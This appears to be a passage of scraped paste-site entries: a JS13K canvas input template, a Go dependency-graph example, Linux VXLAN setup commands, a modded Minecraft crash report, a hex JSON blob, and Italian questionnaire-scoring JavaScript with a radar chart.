                font-family: ""Lucida Console"", ""Courier New"", monospace;
            }
            #title2 {
                position: absolute; 
                bottom: 24px; 
                left: 25px; 
                color: aliceblue;
                font-family: ""Lucida Console"", ""Courier New"", monospace;
            }
            canvas {
                display: block;
                margin: auto;
                /* cursor: none; */
                background-color: #111111;
            }
            @media only screen and (min-device-width: 320px) and (max-device-width: 768px) and (orientation: portrait) {
                canvas {
                    transform: rotate(90deg);
                    transform-origin: center center;
                }
            }
        </style>
        <!-- <link rel=""stylesheet"" href=""style.css""> -->
        <!-- <script src=""https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js""></script> -->
        <!-- <script type=""module"" src=""./src/main.js""></script> -->
        <script>       
            var up = false, right = false, down = false, left = false; // keyboard values
            var c_up = false, c_right = false, c_down = false, c_left = false; // controller values
            // Baseline variables 
            var mobile, app, cvs, cx, w, h, asp, asp2, rect, rng, seed, mouseX, mouseY;
            // Scalings
            var w2 = 960; var h2 = 540;
            // Toggles
            var debug = true;
            var webGL = true;
            //GamePad
            var gp = navigator.getGamepads()[0];

            // App Setup
            window.onload = function() 
            {
                initSetup();
            }

            function initSetup() 
            {
                console.log(""Initilizing..."");
                cvs = document.getElementById('cvs');
                cx = cvs.getContext(""2d"");
                w = cvs.clientWidth;
                h = cvs.clientHeight;
                asp = w/h; // Aspect ratio of window
                asp2 = w2/h2; // Aspect ratio of inner cvs
                
                cx.imageSmoothingEnabled = false; // gritty
                
                // setup listeners, check for game controller
                setupEventListeners(cvs);
                if (!gp) { console.log(""Gamepad not found (press a button on the controller to connect)""); }

                tick();
            }

            function tick(timestamp) 
            {
                cx.clearRect(0, 0, w, h);
                
                // Update gamepad state every loop
                gp = navigator.getGamepads()[0];
                if (gp) {
                    checkGamePad();
                }

                // Draw debug outputs to cavans
                cx.font = '16px monospace';
                cx.fillStyle = '#fff';
                if(up || c_up) { cx.fillStyle = '#3f3'; }
                cx.fillText('Up: ' + (up || c_up), 10, 30);

                cx.fillStyle = '#fff';
                if(down || c_down) { cx.fillStyle = '#3f3'; }
                cx.fillText('Down: ' + (down || c_down), 10, 50);

                cx.fillStyle = '#fff';
                if(left || c_left) { cx.fillStyle = '#3f3'; }
                cx.fillText('Left: ' + (left || c_left), 10, 70);

                cx.fillStyle = '#fff';
                if(right || c_right) { cx.fillStyle = '#3f3'; }
                cx.fillText('Right: ' + (right || c_right), 10, 90);

                // Request next frame, ie r loop
                requestAnimationFrame(tick);
            }

            // Keydown listener
            onkeydown = (e) => {
                const k = e.key.toLowerCase();
                // Up (up / W / Z)
                if (k === ""arrowup"" || k === ""w"" || k === ""z"") up = true;
                // Right (right / D)
                if (k === ""arrowright"" || k === ""d"") right = true;
                // Down (down / S)
                if (k === ""arrowdown"" || k === ""s"") down = true;
                // Left (left / A / Q)
                if (k === ""arrowleft"" || k === ""a"" ||k === ""q"") left = true;
                // console.log(""E: "" + e.key);
            }

            // Keyup listener
            onkeyup = (e) => {
                const k = e.key.toLowerCase();
                // Up
                if (k === ""arrowup"" || k === ""w"" || k === ""z"") up = false;
                // Right
                if (k === ""arrowright"" || k === ""d"") right = false;
                // Down
                if (k === ""arrowdown"" || k === ""s"") down = false;
                // Left
                if(k === ""arrowleft"" || k === ""a"" || k === ""q"") left = false;
                // console.log(""UP: "" + up);
            }

            function checkGamePad() {
                const b = gp.buttons;
                //debug all buttons
                // console.log(JSON.stringify(gp.buttons.map(b => b.value), null, 2));
                // b.forEach((btn, index) => {
                //     if (btn.pressed) console.log(""Button pressed:"", index);
                // });

                // D-Pad buttons
                c_up    = b[12]?.pressed;
                c_down  = b[13]?.pressed;
                c_left  = b[14]?.pressed;
                c_right = b[15]?.pressed;
        
                // Left stick test
                const lx = gp.axes[0], ly = gp.axes[1];
                if (lx < -0.5) c_left = true;
                if (lx >  0.5) c_right = true;
                if (ly < -0.5) c_up = true;
                if (ly >  0.5) c_down = true;
            }

            function setupEventListeners(c) {
                // Keyboard (WASD/ZQSD/Arrows) Events
                c.addEventListener('keydown', onkeydown);
                c.addEventListener('keyup', onkeyup);

                // Gamepad/Controller Events
                window.addEventListener(""gamepadconnected"", (e) => {
                    // console.log(""Gamepad connected:"", e.gamepad);
                    console.log(
                        ""Gamepad connected at index %d: %s. %d buttons, %d axes."",
                        e.gamepad.index,
                        e.gamepad.id,
                        e.gamepad.buttons.length,
                        e.gamepad.axes.length,
                    );
                    gp = navigator.getGamepads()[0];
                });
                window.addEventListener(""gamepaddisconnected"", e => {
                    console.log(""Gamepad disconnected:"", e.gamepad.id);
                });

                // Mouse/Touch Events
                c.addEventListener('pointermove', (e) => {
                    // console.log(""pointermove"");
                });
                c.addEventListener('pointerdown', (e) => {
                    // console.log(""pointerdown"");
                });
                c.addEventListener('pointerup', (e) => {
                    // console.log(""pointerup"");
                });
                c.addEventListener('pointercancel', (e) => {
                    // The same as pointer up, but for mobile specific cases
                    // console.log(""pointercancel"");
                });
            }
        </script>
    </head>
    <body>
        <h3 id=""title"">JS13K 2025 (Warmup/Template)</h3>
        <p id=""title2"">v.0.1x</p>
        <canvas id=""cvs"" width=""960"" height=""540""></canvas>
    </body>
</html>"
uBKPMPcU,QuestionGetAncestors,gautamhitesh,Go,Tuesday 17th of June 2025 06:36:42 AM CDT,"package main

import ""fmt""

type Services interface {
	AddService(service int, dependency int)
	GetAncestors(service int, depth int)
}

type ServiceManager struct {
	servicemap map[int][]int
}

func (servicemanager *ServiceManager) AddService(service, dependency int) {
	servicemanager.servicemap[service] = append(servicemanager.servicemap[service], dependency)
}

func (serviceManager *ServiceManager) GetAncestors(service, depth int) []int { //added depth
	visited := make(map[int]bool) //to avoid dupicate results
	var res []int
	var dfs func(service, depth int)
	dfs = func(service, depth int) {
		if depth == 0 {
			return
		}
		for _, dep := range serviceManager.servicemap[service] {
			if !visited[dep] {
				visited[dep] = true
				res = append(res, dep)
				dfs(dep, depth-1)
			}
		}
	}

	dfs(service, depth)
	return res
}

func main() {
	serviceManager := &ServiceManager{
		servicemap: make(map[int][]int),
	}
	serviceManager.AddService(0, 1)
	serviceManager.AddService(1, 2)
	fmt.Println(serviceManager.GetAncestors(0, 1))
	serviceManager.AddService(0, 3)
	serviceManager.AddService(3, 4)
	fmt.Println(serviceManager.GetAncestors(0, 2))
}
"
aPC5FpeH,Untitled,Nemesiz,Bash,Tuesday 17th of June 2025 06:31:51 AM CDT,"ip link add vxb1 type vxlan id 5000 local LOCAL_IP  remote REMOTE_IP dev vmbr1 dstport 6000
ip link add vxb2 type vxlan id 5001 local LOCAL_IP  remote REMOTE_IP dev vmbr1 dstport 6001
ip link add vxb3 type vxlan id 5002 local LOCAL_IP  remote REMOTE_IP dev vmbr1 dstport 6002
ip link add vxb4 type vxlan id 5003 local LOCAL_IP  remote REMOTE_IP dev vmbr1 dstport 6003

ip link set vxb1 up
ip link set vxb2 up
RTNETLINK answers: Address already in use
ip link set vxb3 up
ip link set vxb4 up
"
qJuLLSZE,Untitled,Quantum_Rage,Java,Tuesday 17th of June 2025 06:18:15 AM CDT,"---- Minecraft Crash Report ----
// I bet Cylons wouldn't have this problem.

Time: 2025-06-17 20:49:05
Description: Exception ticking world

java.lang.UnsupportedOperationException
	at knot//com.google.common.collect.ImmutableCollection.add(ImmutableCollection.java:264)
	at knot//net.minecraft.class_2852.mdc9645b$protosky$lambda$deserialize_graces$0$1(class_2852.java:2098)
	at java.base/java.lang.Iterable.forEach(Iterable.java:75)
	at knot//net.minecraft.class_2852.modifyReturnValue$cdj000$protosky$deserialize_graces(class_2852.java:2097)
	at knot//net.minecraft.class_2852.method_12395(class_2852.java:241)
	at knot//net.minecraft.class_3898.mdc9645b$c2me-threading-chunkio$lambda$loadChunk$3$1c(class_3898.java:9076)
	at java.base/java.util.concurrent.CompletableFuture$UniApply.tryFire(CompletableFuture.java:646)
	at java.base/java.util.concurrent.CompletableFuture$Completion.run(CompletableFuture.java:482)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1136)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:635)
	at java.base/java.lang.Thread.run(Thread.java:840)


A detailed walkthrough of the error, its code path and all known details is as follows:
---------------------------------------------------------------------------------------

-- Head --
Thread: Server thread
Stacktrace:
	at knot//com.google.common.collect.ImmutableCollection.add(ImmutableCollection.java:264)
	at knot//net.minecraft.class_2852.mdc9645b$protosky$lambda$deserialize_graces$0$1(class_2852.java:2098)
	at java.base/java.lang.Iterable.forEach(Iterable.java:75)
	at knot//net.minecraft.class_2852.modifyReturnValue$cdj000$protosky$deserialize_graces(class_2852.java:2097)
	at knot//net.minecraft.class_2852.method_12395(class_2852.java:241)

-- Affected level --
Details:
	All players: 1 total; [class_3222['Quantum_rage'/3, l='ServerLevel[New World]', x=8.50, y=80.19, z=8.50]]
	Chunk stats: 21556
	Level dimension: aether:the_aether
	Derived: true
	Level spawn location: World: (8,64,8), Section: (at 8,0,8 in 0,4,0; chunk contains blocks 0,0,0 to 15,255,15), Region: (0,0; contains chunks 0,0 to 31,31, blocks 0,0,0 to 511,255,511)
	Level time: 1193 game time, 1193 day time
	Level name: New World
	Level game mode: Game mode: creative (ID 1). Hardcore: false. Cheats: true
	Level weather: Rain time: 136000 (now: false), thunder time: 92793 (now: false)
	Known server brands: fabric
	Removed feature flags: 
	Level was modded: true
	Level storage version: 0x04ABD - Anvil
Stacktrace:
	at knot//net.minecraft.server.MinecraftServer.method_3813(MinecraftServer.java:900)
	at knot//net.minecraft.server.MinecraftServer.method_3748(MinecraftServer.java:824)
	at knot//net.minecraft.class_1132.method_3748(class_1132.java:105)
	at knot//net.minecraft.server.MinecraftServer.method_29741(MinecraftServer.java:671)
	at knot//net.minecraft.server.MinecraftServer.method_29739(MinecraftServer.java:265)
	at java.base/java.lang.Thread.run(Thread.java:840)

-- System Details --
Details:
	Minecraft Version: 1.20.1
	Minecraft Version ID: 1.20.1
	Operating System: Windows 10 (amd64) version 10.0
	Java Version: 17.0.15, Microsoft
	Java VM Version: OpenJDK 64-Bit Server VM (mixed mode), Microsoft
	Memory: 1377303928 bytes (1313 MiB) / 3674210304 bytes (3504 MiB) up to 10301210624 bytes (9824 MiB)
	CPUs: 32
	Processor Vendor: AuthenticAMD
	Processor Name: AMD Ryzen 9 5950X 16-Core Processor            
	Identifier: AuthenticAMD Family 25 Model 33 Stepping 0
	Microarchitecture: Zen 3
	Frequency (GHz): 3.40
	Number of physical packages: 1
	Number of physical CPUs: 16
	Number of logical CPUs: 32
	Graphics card #0 name: AMD Radeon RX 6900 XT
	Graphics card #0 vendor: Advanced Micro Devices, Inc. (0x1002)
	Graphics card #0 VRAM (MB): 4095.00
	Graphics card #0 deviceId: 0x73bf
	Graphics card #0 versionInfo: DriverVersion=32.0.21013.1000
	Memory slot #0 capacity (MB): 32768.00
	Memory slot #0 clockSpeed (GHz): 2.40
	Memory slot #0 type: DDR4
	Memory slot #1 capacity (MB): 32768.00
	Memory slot #1 clockSpeed (GHz): 2.40
	Memory slot #1 type: DDR4
	Memory slot #2 capacity (MB): 32768.00
	Memory slot #2 clockSpeed (GHz): 2.40
	Memory slot #2 type: DDR4
	Memory slot #3 capacity (MB): 32768.00
	Memory slot #3 clockSpeed (GHz): 2.40
	Memory slot #3 type: DDR4
	Virtual memory max (MB): 220084.58
	Virtual memory used (MB): 68004.19
	Swap memory total (MB): 89088.00
	Swap memory used (MB): 818.66
	JVM Flags: 22 total; -XX:HeapDumpPath=MojangTricksIntelDriversForPerformance_javaw.exe_minecraft.exe.heapdump -Xss1M -Xmx9824m -Xms256m -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:InitiatingHeapOccupancyPercent=15 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1
	Fabric Mods: 
		accessories: Accessories 1.0.0-beta.47+1.20.1
			io_wispforest_endec: endec 0.1.8
			io_wispforest_endec_gson: gson 0.1.5
			io_wispforest_endec_netty: netty 0.1.4
		aether: The Aether 1.5.2-beta.6
			cardinal-components-base: Cardinal Components API (base) 5.2.2
			cardinal-components-entity: Cardinal Components API (entities) 5.2.2
			cardinal-components-world: Cardinal Components API (worlds) 5.2.2
			cumulus_menus: Cumulus 1.20.1-1.0.1-fabric
			mm_shedaniel: Manningham Mills (shedaniel's fork) 2.4.1
			nitrogen_internals: Nitrogen 1.20.1-1.0.15-fabric
			porting_lib_asm: Porting Lib ASM 2.3.9-beta.51+1.20.1
			porting_lib_base: Porting Lib Base 2.3.9-beta.52+1.20.1
				com_electronwill_night-config_core: core 3.6.6
				com_electronwill_night-config_toml: toml 3.6.6
				porting_lib_accessors: Porting Lib Accessors 2.3.9-beta.52+1.20.1
				porting_lib_attributes: Porting Lib Attributes 2.3.9-beta.52+1.20.1
				porting_lib_common: Porting Lib Common 2.3.9-beta.52+1.20.1
				porting_lib_config: Porting Lib Config 2.3.9-beta.52+1.20.1
				porting_lib_core: Porting Lib Core 2.3.9-beta.52+1.20.1
				porting_lib_entity: Porting Lib Entity 2.3.9-beta.52+1.20.1
				porting_lib_extensions: Porting Lib Extensions 2.3.9-beta.52+1.20.1
				porting_lib_fluids: Porting Lib Fluids 2.3.9-beta.52+1.20.1
				porting_lib_gui_utils: Porting Lib Gui Utils 2.3.9-beta.52+1.20.1
				porting_lib_lazy_registration: Porting Lib Lazy Register 2.3.9-beta.52+1.20.1
				porting_lib_mixin_extensions: Porting Lib Mixin Extensions 2.3.9-beta.52+1.20.1
				porting_lib_tool_actions: Porting Lib Tool Actions 2.3.9-beta.52+1.20.1
				porting_lib_transfer: Porting Lib Transfer 2.3.9-beta.52+1.20.1
				porting_lib_utility: Porting Lib Utility 2.3.9-beta.52+1.20.1
				reach-entity-attributes: Reach Entity Attributes 2.4.0
			porting_lib_blocks: Porting Lib Blocks 2.3.9-beta.51+1.20.1
			porting_lib_brewing: Porting Lib Brewing 2.3.9-beta.51+1.20.1
			porting_lib_client_events: Porting Lib Client Events 2.3.9-beta.51+1.20.1
			porting_lib_data: Porting Lib Data 2.3.9-beta.51+1.20.1
			porting_lib_items: Porting Lib Items 2.3.9-beta.51+1.20.1
			porting_lib_level_events: Porting Lib Level Events 2.3.9-beta.51+1.20.1
			porting_lib_loot: Porting Lib Loot 2.3.9-beta.51+1.20.1
			porting_lib_model_generators: Porting Lib Model Generators 2.3.9-beta.51+1.20.1
				porting_lib_model_materials: Porting Lib Model Materials 2.3.9-beta.51+1.20.1
			porting_lib_model_loader: Porting Lib Model Loader 2.3.9-beta.51+1.20.1
			porting_lib_models: Porting Lib Models 2.3.9-beta.51+1.20.1
			porting_lib_networking: Porting Lib Networking 2.3.9-beta.51+1.20.1
			porting_lib_recipe_book_categories: Porting Lib Recipe Book Categories 2.3.9-beta.51+1.20.1
			porting_lib_tags: Porting Lib Tags 3.0
		c2me: Concurrent Chunk Management Engine 0.2.0+alpha.11.16
			c2me-base: Concurrent Chunk Management Engine (Base) 0.2.0+alpha.11.16
			c2me-client-uncapvd: Concurrent Chunk Management Engine (Client/Uncap View Distance) 0.2.0+alpha.11.16
			c2me-fixes-chunkio-threading-issues: Concurrent Chunk Management Engine (Fixes/Chunk IO/Threading Issues) 0.2.0+alpha.11.16
			c2me-fixes-general-threading-issues: Concurrent Chunk Management Engine (Fixes/General/Threading Issues) 0.2.0+alpha.11.16
			c2me-fixes-worldgen-threading-issues: Concurrent Chunk Management Engine (Fixes/WorldGen/Threading Issues) 0.2.0+alpha.11.16
			c2me-fixes-worldgen-vanilla-bugs: Concurrent Chunk Management Engine (Fixes/WorldGen/Vanilla Bugs) 0.2.0+alpha.11.16
			c2me-notickvd: Concurrent Chunk Management Engine (No Tick View Distance) 0.2.0+alpha.11.16
			c2me-opts-allocs: Concurrent Chunk Management Engine (Optimizations/Memory Allocations) 0.2.0+alpha.11.16
			c2me-opts-chunk-access: Concurrent Chunk Management Engine (Optimizations/Chunk Access) 0.2.0+alpha.11.16
			c2me-opts-chunkio: Concurrent Chunk Management Engine (Optimizations/Chunk IO) 0.2.0+alpha.11.16
			c2me-opts-math: Concurrent Chunk Management Engine (Optimizations/Math) 0.2.0+alpha.11.16
			c2me-opts-scheduling: Concurrent Chunk Management Engine (Optimizations/Scheduling) 0.2.0+alpha.11.16
			c2me-opts-worldgen-general: Concurrent Chunk Management Engine (Optimizations/General WorldGen) 0.2.0+alpha.11.16
			c2me-opts-worldgen-vanilla: Concurrent Chunk Management Engine (Optimizations/Vanilla WorldGen) 0.2.0+alpha.11.16
			c2me-rewrites-chunk-serializer: Concurrent Chunk Management Engine (Rewrites/Chunk Serializer) 0.2.0+alpha.11.16
			c2me-rewrites-chunkio: Concurrent Chunk Management Engine (Rewrites/Chunk IO) 0.2.0+alpha.11.16
			c2me-server-utils: Concurrent Chunk Management Engine (Server Utils) 0.2.0+alpha.11.16
			c2me-threading-chunkio: Concurrent Chunk Management Engine (Threading/WorldGen) 0.2.0+alpha.11.16
			c2me-threading-lighting: Concurrent Chunk Management Engine (Threading/Lighting) 0.2.0+alpha.11.16
			c2me-threading-worldgen: Concurrent Chunk Management Engine (Threading/WorldGen) 0.2.0+alpha.11.16
			com_ibm_async_asyncutil: asyncutil 0.1.0
			net_objecthunter_exp4j: exp4j 0.4.8
			org_threadly_threadly: threadly 7.0
		cloth-config: Cloth Config v11 11.1.136
			cloth-basic-math: cloth-basic-math 0.6.1
		cmdkit: Command Debug Service 3.0.1
		fabric-api: Fabric API 0.92.6+1.20.1
			fabric-api-base: Fabric API Base 0.4.32+1802ada577
			fabric-api-lookup-api-v1: Fabric API Lookup API (v1) 1.6.37+1802ada577
			fabric-biome-api-v1: Fabric Biome API (v1) 13.0.14+1802ada577
			fabric-block-api-v1: Fabric Block API (v1) 1.0.12+1802ada577
			fabric-block-view-api-v2: Fabric BlockView API (v2) 1.0.3+924f046a77
			fabric-blockrenderlayer-v1: Fabric BlockRenderLayer Registration (v1) 1.1.42+1802ada577
			fabric-client-tags-api-v1: Fabric Client Tags 1.1.3+1802ada577
			fabric-command-api-v1: Fabric Command API (v1) 1.2.35+f71b366f77
			fabric-command-api-v2: Fabric Command API (v2) 2.2.14+1802ada577
			fabric-commands-v0: Fabric Commands (v0) 0.2.52+df3654b377
			fabric-containers-v0: Fabric Containers (v0) 0.1.67+df3654b377
			fabric-content-registries-v0: Fabric Content Registries (v0) 4.0.13+1802ada577
			fabric-convention-tags-v1: Fabric Convention Tags 1.5.6+1802ada577
			fabric-crash-report-info-v1: Fabric Crash Report Info (v1) 0.2.20+1802ada577
			fabric-data-attachment-api-v1: Fabric Data Attachment API (v1) 1.0.2+de0fd6d177
			fabric-data-generation-api-v1: Fabric Data Generation API (v1) 12.3.7+1802ada577
			fabric-dimensions-v1: Fabric Dimensions API (v1) 2.1.55+1802ada577
			fabric-entity-events-v1: Fabric Entity Events (v1) 1.6.1+1c78457f77
			fabric-events-interaction-v0: Fabric Events Interaction (v0) 0.6.5+13a40c6677
			fabric-events-lifecycle-v0: Fabric Events Lifecycle (v0) 0.2.64+df3654b377
			fabric-game-rule-api-v1: Fabric Game Rule API (v1) 1.0.41+1802ada577
			fabric-item-api-v1: Fabric Item API (v1) 2.1.29+1802ada577
			fabric-item-group-api-v1: Fabric Item Group API (v1) 4.0.14+1802ada577
			fabric-key-binding-api-v1: Fabric Key Binding API (v1) 1.0.38+1802ada577
			fabric-keybindings-v0: Fabric Key Bindings (v0) 0.2.36+df3654b377
			fabric-lifecycle-events-v1: Fabric Lifecycle Events (v1) 2.2.23+1802ada577
			fabric-loot-api-v2: Fabric Loot API (v2) 1.2.3+1802ada577
			fabric-loot-tables-v1: Fabric Loot Tables (v1) 1.1.47+9e7660c677
			fabric-message-api-v1: Fabric Message API (v1) 5.1.10+1802ada577
			fabric-mining-level-api-v1: Fabric Mining Level API (v1) 2.1.52+1802ada577
			fabric-model-loading-api-v1: Fabric Model Loading API (v1) 1.0.4+1802ada577
			fabric-models-v0: Fabric Models (v0) 0.4.3+9386d8a777
			fabric-networking-api-v1: Fabric Networking API (v1) 1.3.14+a158aa0477
			fabric-networking-v0: Fabric Networking (v0) 0.3.54+df3654b377
			fabric-object-builder-api-v1: Fabric Object Builder API (v1) 11.1.5+e35120df77
			fabric-particles-v1: Fabric Particles (v1) 1.1.3+1802ada577
			fabric-recipe-api-v1: Fabric Recipe API (v1) 1.0.24+1802ada577
			fabric-registry-sync-v0: Fabric Registry Sync (v0) 2.3.6+1802ada577
			fabric-renderer-api-v1: Fabric Renderer API (v1) 3.2.2+1802ada577
			fabric-renderer-indigo: Fabric Renderer - Indigo 1.5.3+85287f9f77
			fabric-renderer-registries-v1: Fabric Renderer Registries (v1) 3.2.47+df3654b377
			fabric-rendering-data-attachment-v1: Fabric Rendering Data Attachment (v1) 0.3.39+92a0d36777
			fabric-rendering-fluids-v1: Fabric Rendering Fluids (v1) 3.0.29+1802ada577
			fabric-rendering-v0: Fabric Rendering (v0) 1.1.50+df3654b377
			fabric-rendering-v1: Fabric Rendering (v1) 3.0.9+1802ada577
			fabric-resource-conditions-api-v1: Fabric Resource Conditions API (v1) 2.3.9+1802ada577
			fabric-resource-loader-v0: Fabric Resource Loader (v0) 0.11.12+fb82e9d777
			fabric-screen-api-v1: Fabric Screen API (v1) 2.0.9+1802ada577
			fabric-screen-handler-api-v1: Fabric Screen Handler API (v1) 1.3.33+1802ada577
			fabric-sound-api-v1: Fabric Sound API (v1) 1.0.14+1802ada577
			fabric-transfer-api-v1: Fabric Transfer API (v1) 3.3.6+8dd72ea377
			fabric-transitive-access-wideners-v1: Fabric Transitive Access Wideners (v1) 4.3.2+1802ada577
		fabricloader: Fabric Loader 0.16.14
			mixinextras: MixinExtras 0.4.1
		java: OpenJDK 64-Bit Server VM 17
		minecraft: Minecraft 1.20.1
		protosky: ProtoSky 1.3.0
	Server Running: true
	Player Count: 1 / 8; [class_3222['Quantum_rage'/3, l='ServerLevel[New World]', x=8.50, y=80.19, z=8.50]]
	Data Packs: vanilla, fabric, builtin/aether_accessories, file/skyblock_changes.zip
	Enabled Feature Flags: minecraft:vanilla
	World Generation: Experimental
	Type: Integrated Server (map_client.txt)
	Is Modded: Definitely; Client brand changed to 'fabric'; Server brand changed to 'fabric'
	Launched Version: fabric-loader-0.16.14-1.20.1"
iy0ZNqBC,dataNone,TestGuy1,JSON,Tuesday 17th of June 2025 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '3439991dcd827b51a00c2d2fe2eeb4d727d7dab7de9c4108c16591056490ce88efc7a552642df4a4db183a6885c6d477700876eeb89915d84b12aa6a97ba465112a403a705cd1d645c5affe3dfa7ea086581d2eb8c3db21c4e332a884e20b3cc51ffd98b8e2d5a13b195ac386a616e43116ba570a9d72c7ab4b4d7fa10e4533a',
  otherdata: [
    '94400a15f229f954ff2cf6fc9c648ab5',
    'eb223d0f29e054638a8b1347cd3d5f87',
    '109e96c132282d132e43f196fe94e2fb',
    '6baca12b98b6e79a273fc565aca90ed3',
    '116c738c7ba2ca55f74c5615b36bfd5f',
    'b1a025aec73db88aa186f45169aefe3c',
    'e0a2e0d97b2ec1f9669ca79f5cc05ddc',
    '5a6e9d8928f2c921cf0f6a112c6d26bf'
  ]
}"
qvwQceUx,Untitled,ciaojep,JavaScript,Tuesday 17th of June 2025 05:50:16 AM CDT,"// 1) Configurazione delle aree, con max e descrizioni per fascia
const areas = [
  {
    id: 16, key: 'leadership',      label: 'Leadership',      max: 4 * 5,
    desc: [
      'Leadership basso: Nel tuo lavoro preferisci occuparti di un ambito circoscritto, magari sotto la supervisione di qualcuno, senza dover considerare anche il lavoro che potrebbe essere fatto da altri.',
      'Leadership medio: Sei in grado di organizzare il lavoro quello degli altri, ma preferisci occuparti esclusivamente dell\'ambito che è di tua competenza.',
      'Leadership alto: Hai spiccate doti di leadership e una forte attitudine a organizzare e dirigere il lavoro degli altri.'
    ]
  },
  {
    id: 45, key: 'selfcapability',  label: 'Self-Capability', max: 0,
    desc: [
      'Self-capability basso: Tendi a ritenerti poco competente, questo incide sulla soddisfazione che ricavi da quello che fai e sulla percezione di poter controllare le situazioni.',
      'Self-capability medio: Ti ritieni pronto in parte a mettere in atto le tue competenze, di conseguenza non sempre hai soddisfazione in quello che fai. Senti di poter controllare solo in parte gli eventi.',
      'Self-capability alto: Sei fortemente convinto delle tue competenze e i risultati che ottieni ti soddisfano. Le situazioni e gli eventi che incontri sono sfide che affronti positivamente per poter confermare le tue abilità.'
    ]
  },
  {
    id: 46, key: 'innovation',      label: 'Innovation',      max: 2 * 5,
    desc: [
      'Innovation basso: Ciò che è nuovo ti spaventa un po\' e preferisci affidarti a metodi collaudati per affrontare il tuo lavoro.',
      'Innovation medio: Le cose nuove presentano secondo te il loro fascino, ma nel lavoro è meglio affidarsi a metodi collaudati e per questo più sicuri.',
      'Innovation alto: Sei caratterizzato/a da una spiccata curiosità verso tutto ciò che è nuovo, e ritieni che guardarti intorno possa davvero essere un modo per affrontare il tuo lavoro.'
    ]
  },
  {
    id: 47, key: 'problemsolving',  label: 'Problem Solving',  max: 2 * 5,
    desc: [
      'Problem Solving basso: Spesso non riesci ad affrontare le questioni con approccio nuovo, tenti a preferire i metodi lineari tradizionali nel risolvere i problemi.',
      'Problem Solving medio: Ti dimostri abbastanza abile nell’affrontare problematiche abbandonando i modelli tradizionali e sei attratto dalle modalità del pensiero divergente.',
      'Problem Solving alto: Affronti con passione le questioni con creatività e con nuove idee. Da tempo hai abbandonato i modelli lineari nelle tue decisioni.'
    ]
  },
  {
    id: 48, key: 'goalorientation', label: 'Goal Orientation', max: 2 * 5,
    desc: [
      'Goal Orientation basso: Nella tua vita il caso e gli altri hanno un ruolo importante nel determinare la tua posizione. Tendi ad essere dispersivo/a e a interrompere le attività intraprese senza portarle a termine.',
      'Goal Orientation medio: Senti di avere il controllo su ciò che ti accade, anche se il caso e/o le altre persone giocano un ruolo non irrilevante nel determinare la tua posizione nel lavoro e nella vita. Sei una persona sufficientemente determinata anche se la tua energia non è senza limiti.',
      'Goal Orientation alto: Sei sicuro/a di avere sempre il controllo su ciò che accade e sei convinto/a che la posizione che ricopri nel lavoro e nella vita dipendono dalle tue abilità e dalle tue competenze. La tua energia e la tua determinazione ti permettono di essere persistente nel raggiungimento di un obiettivo. Non ti abbatti facilmente di fronte agli ostacoli, perché sei convinto/a che esistono sempre mezzi che ti permettono di superarli.'
    ]
  },
  {
    id: 58, key: 'risktaking',     label: 'Risk Taking',     max: 3 * 5,
    desc: [
      'Risk Taking basso: Non ami metterti in gioco, affrontando l\'incertezza o possibili insuccessi. Spesso non ti senti pronto ad affrontare le situazioni che a volte possono non esserti favorevoli.',
      'Risk Taking medio: Non temi di affrontare eventi incerti o eventi che possono anche portare a possibili insuccessi. Sei interessato ad affrontare situazioni che possono non esserti favorevoli.',
      'Risk Taking alto: Cerchi spesso di affrontare progetti innovativi e incerti anche se con margini elevati di insuccesso. Sei fortemente attratto da situazioni che possono non esserti favorevoli.'
    ]
  },
  {
    id: 57, key: 'general',         label: 'Generale',        max: 100,
    desc: [
      'Generale basso: Sei una persona più adatta ad un\'attività lavorativa di tipo dipendente, o comunque un\'attività nella quale non ci siano eccessivi spazi personali di scelta. Ti senti più a tuo agio quando altri dirigono il tuo lavoro. Per questi motivi la tua attitudine all\'imprenditoria sembra non essere particolarmente elevata.',
      'Generale medio: Hai una moderata attitudine all\'imprenditoria, che potrebbe dare frutti positivi con un impegno ad accrescere le tue caratteristiche di creatività e competenza specifica e con una maggiore fiducia nel controllo che puoi esercitare sulla realtà.',
      'Generale alto: La tua attitudine imprenditoriale risulta essere elevata.'
    ]
  }
];

// 2) Soglie
const TH = { low: 35, med: 70 };

// 3) Icone fas
const ICONS = [
  'fas fa-arrow-down',
  'fas fa-arrows-alt-h',
  'fas fa-arrow-up'
];

// 4) Calcola percentuali, inietta commenti/output e prepara dati per il chart
const labels = [], data = [];

areas.forEach(a => {
  const inp = document.querySelector(`input[name=""leform-math-${a.id}""]`);
  const raw = inp ? parseFloat(inp.value) : NaN;
  const pct = a.id === 57
    ? (isNaN(raw) ? 0 : raw)
    : (a.max > 0 && !isNaN(raw) ? Math.round(raw / a.max * 100) : 0);
  const clamped = Math.min(100, Math.max(0, pct));

  // commenti/output per tutte le aree (inclusa general)
  const idx = (!isFinite(clamped) || a.max === 0) ? null
            : clamped <= TH.low ? 0
            : clamped <= TH.med ? 1
            : 2;
  const cEl = document.getElementById('commento-' + a.key);
  const oEl = document.getElementById('output-'   + a.key);
  if (cEl) cEl.innerHTML = idx===null
    ? 'N/A'
    : `<i class=""${ICONS[idx]}"" style=""font-style:normal;""></i> ${a.desc[idx]}`;
  if (oEl) oEl.textContent = (a.id===57)
    ? `${clamped}%`
    : (isNaN(raw)? '' : `${clamped}% (${raw}/${a.max})`);

  // ma per il chart aggiungo solo le aree diverse da general
  if (a.id !== 57) {
    labels.push(a.label);
    data.push(clamped);
  }
});

// 5) Disegna il radar chart senza “Generale”
const container = document.getElementById('radarChartContainer');
if (container) {
  const old = container.querySelector('canvas');
  if (old) container.removeChild(old);
  const canvas = document.createElement('canvas');
  container.style.height = '400px';
  container.appendChild(canvas);
  new Chart(canvas.getContext('2d'), {
    type: 'radar',
    data: { labels, datasets:[{
      data,
      fill:true,
